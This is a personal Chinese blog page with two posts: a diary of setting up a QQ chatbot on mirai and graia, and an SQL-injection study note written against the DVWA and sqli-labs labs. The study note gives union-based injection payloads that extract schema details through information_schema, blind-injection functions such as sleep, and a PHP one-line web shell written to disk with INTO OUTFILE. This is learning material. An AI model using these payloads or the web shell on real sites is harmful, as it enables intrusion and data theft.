<!DOCTYPE html>
<html>
<head hexo-theme='https://volantis.js.org/#2.6.5'>
  <meta charset="utf-8">
  <!-- SEO相关 -->
  
    
      
        <meta name="robots" content="index,follow">
      
    
  
  <!-- 渲染优化 -->
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <!-- 页面元数据 -->
  
    <title>omp&#39;s blog</title>
  
  

  <!-- feed -->
  

  <!-- import meta -->
  

  <!-- link -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">

  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">

  

  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.css">
  

  

  <!-- import link -->
  

  
  
    
<link rel="stylesheet" href="/css/style.css">

  

  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>

  
  
</head>

<body>
<script src="https://cdn.jsdelivr.net/gh/zyoushuo/Blog/hexo/js/mouse_click.js"></script>

  
  <div class="cover-wrapper">
    
      <cover class='cover  full'>
        <div class='cover-body'>
  <div class='a'>
    
    
      <p class="title">omp's blog</p>
    
    
      <p class="subtitle">一个密码学小白的学习之路</p>
    
  </div>
  <div class='b'>
    
      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <input type="text" class="input u-search-input" placeholder="" />
          <i class="icon fas fa-search fa-fw"></i>
        </form>
      </div>
    
    <div class='menu navigation'>
      <ul class='cover-list-h'>
        
          
            <li>
              <a class="nav home"
                href="/archives/"
                
                
                id="archives">
                <i class='fas fa-book fa-fw'></i>文档
              </a>
            </li>
          
            <li>
              <a class="nav home"
                href="/"
                
                
                id="home">
                <i class='fas fa-rss fa-fw'></i>博文
              </a>
            </li>
          
        
      </ul>
    </div>
  </div>
</div>

        <div class="scroll-down"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
      </cover>
    
    <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>
<header class="l_header shadow blur">
  <div class='container'>
  <div class='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h'>
        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/'>
          
          
          
            omp's blog
          
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h'>
          
          
          
            
            
              <li>
                <a class="flat-box" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/categories/
                  
                  
                  
                    id="categories"
                  >
                  <i class='fas fa-folder-open fa-fw'></i>分类
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="flat-box" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
          
				</ul>
			</div>

      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fas fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="Search..." />
        </form>
      </div>

			<ul class='switcher nav-list-h'>
				
					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
				
				<li>
          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="flat-box" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/categories/
                  
                  
                  
                    id="categories"
                  >
                  <i class='fas fa-folder-open fa-fw'></i>分类
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="flat-box" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
            
          </ul>
        </li>
			</ul>
		</div>
	</div>
  </div>
</header>

<script>setLoadingBarProgress(40);</script>

  </div>


  <div class="l_body">
    <div class='body-wrapper'>
      

<div class='l_main'>
  
  <section class="post-list ">
    
      
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
      
    
    
      
        
          <div class='post-wrapper'>
            <article class="post white-box shadow reveal ">
  


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h2 class="title">
    <a href="/2021/01/10/bot/">
      基于mirai和graia框架的机器人搭建
    </a>
  </h2>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="" rel="nofollow">
    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
    <p>omp</p>
  </a>
</div>

            
          
            
              
  
  <div class='new-meta-item category'>
    <a href='/categories/%E5%85%B6%E4%BB%96/' rel="nofollow">
      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
      <p>其他</p>
    </a>
  </div>


            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Jan 10, 2021</p>
  </a>
</div>

            
          
            
              

            
          
            
              
  <div class="new-meta-item browse valine">
    <a class='notlink'>
      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
      <span id="/2021/01/10/bot/" class="leancloud_visitors" data-flag-title="基于mirai和graia框架的机器人搭建">
      <p>
        <span class="leancloud-visitors-count"></span>
      </p>
      </span>
    </a>
  </div>


            
          
            
          
            
          
            
              

            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="基本搭建"><a href="#基本搭建" class="headerlink" title="基本搭建"></a>基本搭建</h2><p>Day1</p>
<p>首先找到了 为数不多可用的sagiri-bot框架</p>
<p>服务器pip换源  pip3 install -r requirements.txt</p>
<p>创建数据库文件同名数据库(这边之前自己没操作服务器，之间修改配置文件把mysql登录跳过了)</p>
<p>source 数据库文件的绝对路径 执行数据库文件</p>
<p>:x:mysql报错</p>
<p>ERROR 1273 (HY000): Unknown collation: ‘utf8mb4_0900_ai_ci’</p>
<p>版本原因：生成转储文件的数据库版本为8.0,要导入sql文件的数据库版本为5.6,因为是高版本导入到低版本，引起1273错误</p>
<p>解决方法：<br> 打开sql文件，将文件中的所有<br> <code>utf8mb4_0900_ai_ci</code>替换为<code>utf8_general_ci</code><br> <code>utf8mb4</code>替换为<code>utf8</code><br> 保存后再次运行sql文件，运行成功</p>
<p>基于mirai框架，需要下mirai-console和配置mirai-api-http</p>
<p>启动mirai-console需要装自启动mirai-console-loader</p>
<p>:zap:优化</p>
<p>这边github太慢了，直接导入gitee仓库</p>
<p>给服务器装一下Java环境</p>
<p>:x:启动console报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.UnsupportedClassVersionError: org&#x2F;zjh&#x2F;openlayersdemo&#x2F;OpenlayersdemoApplication has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0</span><br></pre></td></tr></table></figure>
<p>这边装的java8..  需要重装java11</p>
<p>:x:启动console报错</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.NoSuchMethodError: net.mamoe.mirai.utils.MiraiLogger$Companion.setDefaultLoggerCreator(Lkotlin/jvm/functions/Function1;)V</span><br></pre></td></tr></table></figure>
<p>解决:.\mcl —update-package net.mamoe:mirai-core-all —channel nightly</p>
<p>重新运行mcl 启动mirai-console<br>将mirai-api-http的jar文件拖入plugins</p>
<p>配置生成的setting.yml 文件</p>
<p>authkey 1234567890   占用8888端口</p>
<p>重新启动console</p>
<p>配置sagiri-bot个人信息</p>
<p>:x:java报错</p>
<p>JCE cannot authenticate the provider BC</p>
<p>报错原因：在使用oracle的JDK时，JAR包必须签署特殊的证书才能使用。</p>
<p>使用openJDK或者非oracle的JDK，这样就可以绕开证书的限制。</p>
<p>所以重装了java环境，卸载了原有java11环境，使用yum安装了openjdk,将/etc/profile配置文件中的环境变量更改为openjdk安装目录/usr/lib/jvm/xxx，source使之生效</p>
<p>虽然报错解决了，但对登录不上去这个问题没什么改变…</p>
<p>:x:console登录报错</p>
<p>在mirai-console登录qq报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2021-01-01 16:26:05 E&#x2F;main: Failed to init MiraiConsole.</span><br><span class="line"></span><br><span class="line">net.mamoe.mirai.network.WrongPasswordException: Error(title&#x3D;温馨提示, message&#x3D;当前版本过低，请先升级到手机QQ最新版本。, errorInfo&#x3D;)</span><br></pre></td></tr></table></figure>
<p>最开始报错是不支持滑动验证，根据文档提示修改协议为PAD后</p>
<p>输入验证码登录，若账号密码验证码不正确则报错网络环境问题；若都正确报错以上信息…问题772</p>
<p>已解决，更改协议为WATCH后，验证登录即可</p>
<p>至此mirai部分配置完成，启动需要graia</p>
<p>DAY2</p>
<p>:x:启动bot 报错</p>
<p>python3 sagiri_bot.py报错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File <span class="string">"/usr/lib64/python3.6/functools.py"</span>, line <span class="number">477</span>, <span class="keyword">in</span> lru_cache     <span class="keyword">raise</span> TypeError(<span class="string">'Expected maxsize to be an integer or None'</span>) TypeError: Expected maxsize to be an integer <span class="keyword">or</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<p> 装了SDK</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install graia-application-mirai</span><br><span class="line">pip install graia-broadcast --upgrade</span><br></pre></td></tr></table></figure>
<p>发现不仅是import graia.broadcast产生的报错,后边调库的时候还有很多别的报错，经过很久很久的搜索，终于在graia project的issue下面找到了原因所在</p>
<p>由于pip使用阿里源的问题，直接下载了graia-application-mirai 0.0.6的版本 会出现很多报错</p>
<p><code>$ pip install -i https://pypi.python.org/simple graia-application-mirai==0.1.0</code></p>
<p>更改为0.1.0版本不再报错</p>
<p>:x:启动bot报错</p>
<p>这次又有了船新报错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line">    ^</span><br><span class="line">SyntaxError: future feature annotations <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>
<p>从<code>Python 3.7</code>才可以开始导入<code>__future__``annotations</code></p>
<p>服务器centos自带3.6 重装3.7….. 之前给ubuntu做过升级</p>
<p>装好后更改软连接，使pip3与python3指向3.7</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;python3&#x2F;bin&#x2F;python3 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3</span><br><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;python3&#x2F;bin&#x2F;pip3 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;pip3</span><br></pre></td></tr></table></figure>
<p>重装第三方库</p>
<p>:x:启动bot报错</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AttributeError: <span class="string">'ApplicationLaunched'</span> object has no attribute <span class="string">'app'</span></span><br></pre></td></tr></table></figure>
<p>好家伙，还有什么报错是我没遇到的…</p>
<p>报错原因:问题出在pydantic包，graia.broadcast.entities.event.EventMeta类继承自pydantic中的ModelMetaclass类，在pydantic版本是1.7.1的情况下该类貌似添加了一个空的<strong>slots</strong>属性，导致子类都无法进行self的赋值。把pydantic包回退到1.6.1版本问题解决。</p>
<p>pip3 install pydantic-1.6.1</p>
<p>重新运行bot.py </p>
<p>至此，机器人实现了第一次会话  芜湖~</p>
<p><img src="/2021/01/10/bot/image-20210102175545239.png" alt="image-20210102175545239"></p>
<p><img src="/2021/01/10/bot/image-20210102175556793.png" alt="image-20210102175556793"></p>
<p>DAY3</p>
<p>:zap:优化</p>
<p>编写代码再用winscp上传到服务器太过费劲(关键是老断，vim也比较麻烦</p>
<p>装了vscode的插件sftp</p>
<p>服务器建立相同文件名文件夹  右键直接upload即可</p>
<p>芜湖~</p>
<p>:x:关于scheduler与application不兼容</p>
<p>运行sagiri_bot.py  报错无graia.scheduler模块</p>
<p>装后broadcast版本问题发生冲突…</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">graia-application-mirai <span class="number">0.1</span><span class="number">.0</span> has requirement graia-broadcast&lt;<span class="number">0.0</span><span class="number">.6</span>,&gt;=<span class="number">0.0</span><span class="number">.5</span>, but yo<span class="string">u'll have graia-broadcast 0.5.3 which is incompatible.</span></span><br></pre></td></tr></table></figure>
<p>graia-application-mirai 0.1.0 需要 broadcast<0.0.6,>=0.0.5</0.0.6,></p>
<p>但graia-scheduler需要broadcast<0.6.0,>=0.5.3</0.6.0,></p>
<p>安装scheduler后broadcast版本为0.5.3</p>
<p>解决:搜索后发现文档更新</p>
<p><img src="/2021/01/10/bot/image-20210103225327439.png" alt="image-20210103225327439"></p>
<p>更新到graia-application-mirai==0.1.1后，broadcast版本可以兼容</p>
<p>但是佩奇不能回复了….</p>
<blockquote>
<p>现在服务器软连接都快乱了..记录一下</p>
<p>cd usr/bin</p>
<p>ls -al *python*</p>
<p>python3-&gt;python3.7.0   pip3-&gt;python3.7.0</p>
<p>python3.6-&gt;python3.6.8  pip3.6-&gt; python3.6.8</p>
</blockquote>
<p>最终解决: 看github上作者commit的历史版本找了个合适的graia-application-mirai 0.11.0 ,可以兼容并运行(突然发现graia-application-mirai 都更到0.14.0了</p>
<p>耶斯莫拉，今天佩奇被冻结了呜呜呜呜，又是拼命解冻的一天</p>
<h2 id="bot编写"><a href="#bot编写" class="headerlink" title="bot编写"></a>bot编写</h2><p>DAY4</p>
<p>async与await</p>
<p>def name(x:’str’)-&gt;’int’:</p>
<p>服务器服务后台悬挂(关闭终端不影响)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nohup python xxx.py &amp;  </span><br><span class="line">ps -ef|grep xxx</span><br><span class="line">kill -9 pid</span><br></pre></td></tr></table></figure>
<h3 id="钉钉接口"><a href="#钉钉接口" class="headerlink" title="钉钉接口"></a>钉钉接口</h3><p>可以实现从后台导出日报数据，但必须是企业管理员权限</p>
<p>分析河北师大的组织架构与我创建的APItest映射</p>
<p>河北师范大学(APItest)</p>
<p>2019级群(子部门)</p>
<p>辅导员(子部门群主test)</p>
<p>班长(子部门管理员)</p>
<p>经测试，所有人都可创建表，并对自己创建的表有管理权限</p>
<p>子部门群主和管理员都没有权限登录后台(估计要河北师范大学的管理员</p>
<p>所以不考虑从后台导出表格</p>

      
    </div>
    
      
    
  </section>
</article>

          </div>
        
      
        
          <div class='post-wrapper'>
            <article class="post white-box shadow reveal ">
  


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h2 class="title">
    <a href="/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
      sql注入学习
    </a>
  </h2>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="" rel="nofollow">
    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
    <p>omp</p>
  </a>
</div>

            
          
            
              
  
  <div class='new-meta-item category'>
    <a href='/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/' rel="nofollow">
      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
      <p>学习笔记</p>
    </a>
  </div>


            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Nov 30, 2020</p>
  </a>
</div>

            
          
            
              

            
          
            
              
  <div class="new-meta-item browse valine">
    <a class='notlink'>
      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
      <span id="/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="leancloud_visitors" data-flag-title="sql注入学习">
      <p>
        <span class="leancloud-visitors-count"></span>
      </p>
      </span>
    </a>
  </div>


            
          
            
          
            
          
            
              

            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      
        <a id="more"></a>
<h1 id="14-SQL注入原理"><a href="#14-SQL注入原理" class="headerlink" title="14 SQL注入原理"></a>14 SQL注入原理</h1><h2 id="OWASP-top10"><a href="#OWASP-top10" class="headerlink" title="OWASP top10"></a>OWASP top10</h2><h2 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h2><ul>
<li><p>sql：结构化查询语言</p>
</li>
<li><p>应用系统使用sql管理数据库，采用<strong>拼接</strong> 的方式形成一条完整的数据库语言</p>
</li>
<li><p>把sql命令插入到<strong>web表单</strong>或<strong>输入域名页面请求</strong>的查询字符串</p>
</li>
</ul>
<h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h4 id="什么是数据库"><a href="#什么是数据库" class="headerlink" title="什么是数据库"></a>什么是数据库</h4><h5 id="关系型数据库管理系统（RDBMS）"><a href="#关系型数据库管理系统（RDBMS）" class="headerlink" title="关系型数据库管理系统（RDBMS）"></a>关系型数据库管理系统（RDBMS）</h5><p>关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</p>
<p>RDBMS 的特点：</p>
<ul>
<li>1.数据以表格的形式出现</li>
<li>2.每行为各种记录名称</li>
<li>3.每列为记录名称所对应的数据域</li>
<li>4.许多的行和列组成一张表单</li>
<li>5.若干的表单组成database</li>
</ul>
<p><img src="/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200324111143839.png" alt="image-20200324111143839"></p>
<h4 id="数据库基础-1"><a href="#数据库基础-1" class="headerlink" title="数据库基础"></a>数据库基础</h4><h5 id="常用数据库查询语句"><a href="#常用数据库查询语句" class="headerlink" title="常用数据库查询语句"></a>常用数据库查询语句</h5><ul>
<li>create datebase   创建数据库<strong>数据库名字不能使用全数字</strong></li>
<li>drop database </li>
<li>show databases</li>
<li>select databses() 当前的数据库名</li>
</ul>
<p>使用一个数据库 use 数据库名；</p>
<p><a href="https://www.runoob.com/mysql" target="_blank" rel="noopener">https://www.runoob.com/mysql</a></p>
<h5 id="常用数据库内置变量"><a href="#常用数据库内置变量" class="headerlink" title="常用数据库内置变量"></a>常用数据库内置变量</h5><ul>
<li><p>version() 查询数据库版本</p>
<p>@@version 效果等同</p>
</li>
<li><p>user() 数据库运行的用户</p>
</li>
<li><p>datebase() 数据库名</p>
</li>
</ul>
<p>相当于在命令行下执行 select version()</p>
<h1 id="15、16-mysql注入常见函数"><a href="#15、16-mysql注入常见函数" class="headerlink" title="15、16   mysql注入常见函数"></a>15、16   mysql注入常见函数</h1><p>1.字符串链接函数</p>
<ul>
<li>concat 链接多个字符串 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(name,&#39;|&#39;,email,&#39;|&#39;,passwprd) from users;</span><br><span class="line">#若字符串查询内容中有一个为空，则整体为空</span><br></pre></td></tr></table></figure>
<ul>
<li>concat_ws</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#39;|&#39;,name.email,password) from users;</span><br><span class="line">#不会整体为空，第一个参数为分隔符，如果第一个参数为空，则整体为空</span><br></pre></td></tr></table></figure>
<ul>
<li><p>group_concat</p>
<p>把字段里的内容一起显示，限制：查询出来的结果的长度默认是1024</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(username) from users;</span><br></pre></td></tr></table></figure>
<p>​            可以进行联合使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(concat_ws(&#39;|&#39;,username,id)) from users;</span><br></pre></td></tr></table></figure>
<p>2.字符串截取函数</p>
<p>所有函数操作数从1开始而不是从0开始，除limit外</p>
<ul>
<li>substring</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select substring((select username from users limit 0,1)，1，2)</span><br><span class="line">#substring第一个参数 查询的结果字符串，第二个参数 从什么地方开始截取，第三个参数 长度是多少</span><br><span class="line">#limit 如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目</span><br></pre></td></tr></table></figure>
<p>substr也可以代替使用</p>
<ul>
<li>mid</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select mid(&#39;test123&#39;,2,3)</span><br><span class="line">&gt;est</span><br></pre></td></tr></table></figure>
<ul>
<li><p>left</p>
<p>从左开始截取长度为3，right函数相反</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select left(&#39;test123&#39;,3)</span><br><span class="line">&gt;tes</span><br><span class="line">select right(&#39;test123&#39;,3)</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure>
<ul>
<li><p>locate</p>
<p>返回第一个参数字符串在第二个参数中第一次出现的位置</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select locate(‘123test123&#39;,&#39;as123test123&#39;)</span><br><span class="line">&gt;3</span><br></pre></td></tr></table></figure>
<p>3.返回指定的ASCII字符对应的数值</p>
<ul>
<li><p>ascii </p>
<p>只有一个参数，需要转换的</p>
<p>ord与ascii用法相同</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(&#39;a&#39;);</span><br><span class="line">&gt;97</span><br><span class="line">select ascii(substring((select username from users limit 0,1),2,1));</span><br></pre></td></tr></table></figure>
<p>4.返回指定数字对应的ascii字符</p>
<ul>
<li>char</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select char(97);</span><br><span class="line">&gt;a</span><br></pre></td></tr></table></figure>
<p>5.字符串替换</p>
<ul>
<li><p>replace</p>
<p>把username字段里的zangsan sds替换为了hh</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select replace((select  username from users limit 0,1),&#39;zangsan sds&#39;,&#39;hh&#39;)</span><br></pre></td></tr></table></figure>
<p>6.计算长度</p>
<ul>
<li>length</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select length(&#39;hahshdk&#39;);</span><br><span class="line">&gt;7</span><br></pre></td></tr></table></figure>
<ul>
<li><p>count</p>
<p>记录某个表下有多少记录</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from users;</span><br></pre></td></tr></table></figure>
<p>7.时间盲注会用到的函数</p>
<p>sleep、if</p>
<ul>
<li><p>sleep</p>
<p>使输出结果延迟了10s</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users union select 1,2,sleep(10);</span><br></pre></td></tr></table></figure>
<p>8.读写文件函数</p>
<p>写文件</p>
<p>into outfile </p>
<p>把一句话木马写入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php@eval($_POST[&#39;mm&#39;?])&gt;&quot; into outfile &quot;d:&#x2F;shell.php&quot;</span><br></pre></td></tr></table></figure>
<p>一般路径是网站的根路径</p>
<p>into dumpfile(读取二进制文件)</p>
<p>读文件</p>
<p>load_file()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;d:&#x2F;shell.php&#39;)</span><br></pre></td></tr></table></figure>
<p>9.注释方法</p>
<ul>
<li>#</li>
<li>/— -</li>
<li>— +</li>
<li>/**/</li>
<li>/<em> ! </em> /</li>
<li>/<em>!50000 </em>/ mysql5通用，带版本内联注释</li>
</ul>
<h1 id="17-18information-schema相关"><a href="#17-18information-schema相关" class="headerlink" title="17 18information_schema相关"></a>17 18information_schema相关</h1><p>information_schema(mysql 5.0以上的版本才存在)</p>
<p>在MySQL中，把information_schema看作是一个数据库，确切地说是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
<p><a href="https://www.cnblogs.com/shengdimaya/p/6920677.html" target="_blank" rel="noopener">https://www.cnblogs.com/shengdimaya/p/6920677.html</a></p>
<p>SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases结果取于此表</p>
<p>TABLES表：提供了关于数据库中所有的表的信息。详细描述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname(数据库名)的结果取之此表。</p>
<p>COLUMNS表：所有数据库所包含的所有表的列名信息以及每个列的信息。是show columns from schemaname.tablename 的结果取之此表。</p>
<h2 id="information-schema在mysql注入中的运用"><a href="#information-schema在mysql注入中的运用" class="headerlink" title="information_schema在mysql注入中的运用"></a>information_schema在mysql注入中的运用</h2><p>先查询出mysql版本</p>
<h1 id="19-、20-union注入"><a href="#19-、20-union注入" class="headerlink" title="19 、20 union注入"></a>19 、20 union注入</h1><p>实验环境搭建：dvwa sqli-labs</p>
<h2 id="基于union的注入"><a href="#基于union的注入" class="headerlink" title="基于union的注入"></a>基于union的注入</h2><p>?后表示通过get方式传递的参数</p>
<p>order by判断当前查询表里的字段</p>
<p>?id=1 union select 1,2,3</p>
<p>?id=0(查询不到，执行后面的查询) union select 1,2,3</p>
<p>  1,2,3为三个字段用于占位，可以更改为想要查询内容你的对应函数</p>
<h3 id="获取对应表"><a href="#获取对应表" class="headerlink" title="获取对应表"></a>获取对应表</h3><p>?id=0 union select 1,database(),table_name from information_schema.tables where table_schema=’test’</p>
<p>>test:users</p>
<h3 id="查询列"><a href="#查询列" class="headerlink" title="查询列"></a>查询列</h3><p>?id=0 union select 1,database(),column_name from information_schema.columns where table_schema=’test’ and table_name=’users’</p>
<p>>test:id</p>
<p>但列名不止id一个字段</p>
